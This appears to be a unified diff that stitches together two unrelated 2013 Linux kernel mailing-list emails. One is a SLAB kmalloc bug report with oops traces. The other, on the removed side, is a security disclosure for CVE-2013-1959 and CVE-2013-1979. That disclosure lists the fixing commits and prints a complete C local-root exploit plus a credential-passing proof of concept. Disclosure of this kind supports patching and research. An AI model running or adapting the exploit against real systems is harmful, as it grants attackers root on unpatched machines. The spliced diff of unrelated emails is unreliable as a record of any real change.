@@ -1,261 +1,88 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1756907Ab3D2CYK (ORCPT <rfc822;w@1wt.eu>);
-	Sun, 28 Apr 2013 22:24:10 -0400
-Received: from mail-ve0-f176.google.com ([209.85.128.176]:54536 "EHLO
-	mail-ve0-f176.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1756780Ab3D2CYI (ORCPT
+	id S1756917Ab3D2Ckr (ORCPT <rfc822;w@1wt.eu>);
+	Sun, 28 Apr 2013 22:40:47 -0400
+Received: from www262.sakura.ne.jp ([202.181.97.72]:63606 "EHLO
+	www262.sakura.ne.jp" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1756804Ab3D2Ckq (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Sun, 28 Apr 2013 22:24:08 -0400
-MIME-Version: 1.0
-From: Andy Lutomirski <luto@amacapital.net>
-Date: Sun, 28 Apr 2013 19:23:46 -0700
-Message-ID: <CALCETrVLGET46VOL7SWmeCJU9GxDtMoqu-k_DsN8+gU=bLxC-w@mail.gmail.com>
-Subject: Multiple Linux setuid output redirection vulnerabilities
-To: linux-kernel@vger.kernel.org, oss-security@lists.openwall.com
-Content-Type: text/plain; charset=ISO-8859-1
+	Sun, 28 Apr 2013 22:40:46 -0400
+X-Nat-Received: from [202.181.97.72]:51705 [ident-empty]
+	by smtp-proxy.isp with TPROXY id 1367203232.24540
+To: glommer@parallels.com, cl@linux.com, penberg@kernel.org
+Cc: linux-kernel@vger.kernel.org
+Subject: Re: [linux-next-20130422] Bug in SLAB?
+From: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
+References: <201304242108.FDC35910.VJMHFFFSOLOOQt@I-love.SAKURA.ne.jp><201304252120.GII21814.FMJFtHLOOVQFOS@I-love.SAKURA.ne.jp>
+In-Reply-To: <201304252120.GII21814.FMJFtHLOOVQFOS@I-love.SAKURA.ne.jp>
+Message-Id: <201304291140.IFJ95894.OFLSFFHQOOMVJt@I-love.SAKURA.ne.jp>
+X-Mailer: Winbiff [Version 2.51 PL2]
+X-Accept-Language: ja,en,zh
+Date: Mon, 29 Apr 2013 11:40:28 +0900
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+X-Anti-Virus: Kaspersky Anti-Virus for Linux Mail Server 5.6.45.2/RELEASE, bases: 29042013 #9853800, status: clean
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Some of the recent -stable patches are (surprise!) security fixes.
-These were disclosed on the distros list last week.
+Tetsuo Handa wrote:
+> Also, kmalloc_index() in include/linux/slab.h can return 0 to 26.
+> 
+> If (MAX_ORDER + PAGE_SHIFT - 1) > 25 is true and
+> kmalloc_index(64 * 1024 * 1024) is requested (I don't know whether such case
+> happens), kmalloc_caches[26] is beyond the array, for kmalloc_caches[26]
+> allows 0 to 25.
+> 
+> If (MAX_ORDER + PAGE_SHIFT - 1) <= 25 is true and
+> kmalloc_index(64 * 1024 * 1024) is requested (I don't know whether such case
+> happens), kmalloc_caches[26] is beyond the array, for
+> kmalloc_caches[MAX_ORDER + PAGE_SHIFT] allows 0 to MAX_ORDER + PAGE_SHIFT - 1.
+> 
+> Would you recheck that the array size is correct?
+> 
 
-CVE-2013-1959: /proc/<pid>/uid_map has multiple incorrect privilege checks
+I confirmed (on x86_32) that
 
-Linux 3.8 and various 3.9 rcs are affected, depending on
-configuration.  This gives a root shell.  (Actually, it gives a uid 0
-shell with no capabilities, but that's easy to escalate to full root.)
+  volatile unsigned int size = 8 * 1024 * 1024;
+  kmalloc(size, GFP_KERNEL);
 
-Fixed by:
+causes no warning at compile time and returns NULL at runtime. But
 
-commit 935d8aabd4331f47a89c3e1daa5779d23cf244ee
-Author: Linus Torvalds <torvalds@linux-foundation.org>
-Date:   Sun Apr 14 10:06:31 2013 -0700
+  unsigned int size = 8 * 1024 * 1024;
+  kmalloc(size, GFP_KERNEL);
 
-    Add file_ns_capable() helper function for open-time capability checking
+causes compile time warning
 
-commit 6708075f104c3c9b04b23336bb0366ca30c3931b
-Author: Eric W. Biederman <ebiederm@xmission.com>
-Date:   Sun Apr 14 13:47:02 2013 -0700
+  include/linux/slab_def.h:136: warning: array subscript is above array bounds
 
-    userns: Don't let unprivileged users trick privileged users into
-setting the id_map
+and runtime bug.
 
-commit e3211c120a85b792978bcb4be7b2886df18d27f0
-Author: Andy Lutomirski <luto@amacapital.net>
-Date:   Sun Apr 14 16:28:19 2013 -0700
+  BUG: unable to handle kernel NULL pointer dereference at 00000058
+  IP: [<c10b9d76>] kmem_cache_alloc+0x26/0xb0
 
-    userns: Check uid_map's opener's fsuid, not the current fsuid
+I confirmed (on x86_32) that
 
-All three patches are needed.
+  kmalloc(64 * 1024 * 1024, GFP_KERNEL);
 
+causes compile time warning
 
-There's an exploit at the bottom of this email.  To use it, you need
-to supply the program "zerozeroone".  Doing so is left as an exercise
-to the reader.  It can be done on stock installs of Fedora and Ubuntu
-at least.
+  include/linux/slab_def.h:136: warning: array subscript is above array bounds
 
+and runtime bug.
 
+  Kernel BUG at c10b9c5b [verbose debug info unavailable]
+  invalid opcode: 0000 [#1] SMP
 
-CVE-2013-1979: writes to unix sockets capture euid instead of uid
+Also,
 
-This appears to be a regression in 2.6.36, and the regression was
-backported to various older stable series (2.6.35.11 at least).  It is
-almost certainly exploitable for root on most distributions, although
-the vectors will vary.  The fix is:
+  volatile unsigned int size = 64 * 1024 * 1024;
+  kmalloc(size, GFP_KERNEL);
 
-commit 83f1b4ba917db5dc5a061a44b3403ddb6e783494
-Author: Linus Torvalds <torvalds@linux-foundation.org>
-Date:   Fri Apr 19 15:32:32 2013 +0000
+causes no warning at compile time but runtime bug.
 
-    net: fix incorrect credentials passing
+  Kernel BUG at c10b9c5b [verbose debug info unavailable]
+  invalid opcode: 0000 [#1] SMP
 
-
-I don't have an exploit, but there's a PoC below that demonstrates the issue.
-
-
-
-There's another security buglet that probably has extremely low
-impact.  It doesn't have (and shouldn't need) a CVE number.  It's
-fixed here:
-
-commit 41c21e351e79004dbb4efa4bc14a53a7e0af38c5
-Author: Andy Lutomirski <luto@amacapital.net>
-Date:   Sun Apr 14 11:44:04 2013 -0700
-
-    userns: Changing any namespace id mappings should require privileges
-
-
-
---- Begin CVE-2013-1959 exploit ---
-/* userns_root_sploit.c by */
-/* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */
-/* You may use, modify, and redistribute this code under the GPLv2. */
-
-#define _GNU_SOURCE
-#include <unistd.h>
-#include <sched.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sys/mman.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <string.h>
-#include <err.h>
-#include <linux/futex.h>
-#include <errno.h>
-#include <unistd.h>
-#include <sys/syscall.h>
-
-#ifndef CLONE_NEWUSER
-#define CLONE_NEWUSER 0x10000000
-#endif
-
-pid_t parent;
-int *ftx;
-
-int childfn()
-{
-  int fd;
-  char buf[128];
-
-  if (syscall(SYS_futex, ftx, FUTEX_WAIT, 0, 0, 0, 0) == -1 &&
-      errno != EWOULDBLOCK)
-    err(1, "futex");
-
-  sprintf(buf, "/proc/%ld/uid_map", (long)parent);
-  fd = open(buf, O_RDWR | O_CLOEXEC);
-  if (fd == -1)
-    err(1, "open %s", buf);
-  if (dup2(fd, 1) != 1)
-    err(1, "dup2");
-
-  // Write something like "0 0 1" to stdout with elevated capabilities.
-  execl("./zerozeroone", "./zerozeroone");
-
-  return 0;
-}
-
-int main(int argc, char **argv)
-{
-  int dummy, status;
-  pid_t child;
-
-  if (argc < 2) {
-    printf("usage: userns_root_sploit COMMAND ARGS...\n\n"
-           "This will run a command as (global) uid 0 but no capabilities.\n");
-    return 1;
-  }
-
-  ftx = mmap(0, sizeof(int), PROT_READ | PROT_WRITE,
-             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-  if (ftx == MAP_FAILED)
-    err(1, "mmap");
-
-  parent = getpid();
-
-  if (signal(SIGCHLD, SIG_DFL) != 0)
-    err(1, "signal");
-
-  child = fork();
-  if (child == -1)
-    err(1, "fork");
-  if (child == 0)
-    return childfn();
-
-  *ftx = 1;
-  if (syscall(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0)
-    err(1, "futex");
-
-  if (unshare(CLONE_NEWUSER) != 0)
-    err(1, "unshare(CLONE_NEWUSER)");
-
-  if (wait(&status) != child)
-    err(1, "wait");
-  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
-    errx(1, "child failed");
-
-  if (setresuid(0, 0, 0) != 0)
-    err(1, "setresuid");
-  execvp(argv[1], argv+1);
-  err(1, argv[1]);
-
-  return 0;
-}
---- End CVE-2013-1959 exploit ---
-
---- Begin CVE-2013-1979 PoC ---
-/* socket_problem.c - PoC for an SCM_CREDENTIALS issue
- *
- * Actually exploiting something is left as an exercise for the reader.
- *
- * Copyright (c) 2013 Andrew Lutomirski.  All rights reserved.
- * You may use, modify, and redistribute this code under the GPLv2.
- */
-
-#define _GNU_SOURCE
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-#include <stdio.h>
-#include <string.h>
-#include <err.h>
-#include <unistd.h>
-
-int child(int fd)
-{
-  if (dup2(fd, 2) != 2)
-    err(1, "dup2");
-  execlp("su", "evil payload\n", "-U", "nonexistentuser", NULL);
-  err(1, "execlp");
-  return 1;
-}
-
-int main()
-{
-  printf("[PoC for an SCM_CREDENTIALS issue]\n");
-  int sockets[2];
-  if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, sockets) != 0)
-    err(1, "socketpair");
-
-  int one = 1;
-  if (setsockopt(sockets[0], SOL_SOCKET, SO_PASSCRED, &one, sizeof(one)) != 0)
-    err(1, "SO_PASSCRED");
-
-  if (fork() == 0)
-    return child(sockets[1]);
-
-  char buf[4097];
-  char cbuf[CMSG_SPACE(sizeof(struct ucred))];
-  struct iovec iov;
-  iov.iov_base = &buf;
-  iov.iov_len = sizeof(buf);
-  struct msghdr hdr;
-  memset(&hdr, 0, sizeof(hdr));
-  hdr.msg_iov = &iov;
-  hdr.msg_iovlen = 1;
-  hdr.msg_control = cbuf;
-  hdr.msg_controllen = sizeof(cbuf);
-  ssize_t bytes = recvmsg(sockets[0], &hdr, 0);
-  if (bytes < 0)
-    err(1, "recvmsg");
-
-  printf("Received %ld bytes\n", (long)bytes);
-
-  for (struct cmsghdr *cmsg = CMSG_FIRSTHDR(&hdr); cmsg; cmsg =
-CMSG_NXTHDR(&hdr, cmsg)) {
-    if (cmsg->cmsg_level == SOL_SOCKET &&
-        cmsg->cmsg_type == SCM_CREDENTIALS) {
-      struct ucred *cred = (struct ucred *)CMSG_DATA(cmsg);
-      printf("SCM_CREDENTIALS: uid=%ld, gid=%ld, pid=%ld\n",
-             (long)cred->uid, (long)cred->gid, (long)cred->pid);
-    }
-  }
-
-  buf[bytes] = 0;
-  printf("Payload: %s\n[PoC exiting]\n", buf);
-  return 0;
-}
---- End CVE-2013-1979 PoC ---
+There are kernel modules which expect kmalloc() to return NULL rather than
+oops when the requested size is too large.
